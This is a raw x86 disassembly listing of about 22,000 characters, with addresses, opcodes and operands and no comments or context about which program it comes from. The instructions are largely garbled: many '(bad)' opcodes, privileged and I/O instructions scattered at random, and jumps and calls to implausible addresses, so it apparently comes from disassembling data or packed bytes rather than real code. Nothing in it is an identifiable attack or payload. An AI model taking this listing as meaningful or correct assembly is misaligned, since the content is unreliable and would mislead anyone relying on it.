  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
